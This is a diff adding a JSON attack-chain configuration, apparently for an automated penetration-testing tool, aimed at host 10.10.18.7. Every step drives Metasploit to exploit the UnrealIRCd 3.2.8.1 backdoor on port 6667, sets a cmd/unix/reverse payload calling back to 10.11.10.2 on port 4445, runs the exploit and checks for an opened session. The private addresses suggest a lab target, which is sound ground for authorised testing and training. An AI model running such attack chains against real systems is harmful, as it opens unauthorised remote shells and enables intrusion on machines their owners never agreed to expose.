@@ -1,0 +1,73 @@
+{
+    "target": "10.10.18.7",
+    "attack_chains": [
+        {
+            "name": "Chain 3: UnrealIRCd Backdoor Exploit",
+            "use_persistent_session": true,
+            "session_name": "irc_session",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Exploit UnrealIRCd backdoor on port 6667 for shell",
+                    "commands": [
+                        {
+                            "type": "start_session",
+                            "session_name": "irc_session",
+                            "command": "msfconsole -q",
+                            "wait": 5
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "use exploit/unix/irc/unreal_ircd_3281_backdoor",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "set RHOSTS 10.10.18.7",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "set RPORT 6667",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "set PAYLOAD cmd/unix/reverse",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "set LHOST 10.11.10.2",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "set LPORT 4445",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "exploit -j",
+                            "wait": 10
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "sessions -l",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check if a new session is listed in sessions -l output"
+                }
+            ]
+        }
+    ]
+}
